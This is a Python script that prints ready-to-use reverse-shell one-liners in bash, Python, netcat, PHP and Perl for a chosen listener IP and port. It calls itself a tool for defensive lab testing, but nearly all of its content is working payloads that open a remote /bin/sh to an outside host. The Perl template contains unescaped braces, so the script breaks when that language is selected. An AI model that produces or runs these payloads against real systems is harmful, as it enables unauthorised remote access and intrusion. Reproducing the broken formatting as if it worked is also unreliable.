#!/usr/bin/env python3
"""
reverse_shell_generator.py - Generate quick reverse-shell one-liners (for defensive testing)

Example:
  python3 scripts/payloads/reverse_shell_generator.py --lhost 10.0.0.5 --lport 4444 --lang bash

Notes:
- Prints shell commands only; does not execute
- No external dependencies
"""
from __future__ import annotations
import argparse
import sys

GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
NC = "\033[0m"


TEMPLATES = {
    'bash': "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    'python': "python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"{lhost}\",{lport})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'",
    'nc': "nc -e /bin/sh {lhost} {lport}",
    'php': "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    'perl': "perl -e 'use Socket; $i=\"{lhost}\"; $p={lport}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"<&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};'",
}


def main() -> int:
    p = argparse.ArgumentParser(description='Reverse shell generator (strings only)')
    p.add_argument('--lhost', required=True, help='Listener IP')
    p.add_argument('--lport', required=True, help='Listener port')
    p.add_argument('--lang', choices=sorted(TEMPLATES.keys()), default='bash', help='Language/template')
    args = p.parse_args()

    tpl = TEMPLATES.get(args.lang)
    if not tpl:
        print(f"{YELLOW}No template for {args.lang}{NC}")
        return 2

    payload = tpl.format(lhost=args.lhost, lport=args.lport)
    print(f"{GREEN}Generated {args.lang} reverse-shell:{NC}\n\n{payload}\n")
    print(f"{YELLOW}Tip:{NC} Use with a listening server (e.g. nc -lvnp {args.lport}) and test in a lab environment only.")
    return 0


if __name__ == '__main__':
    sys.exit(main())
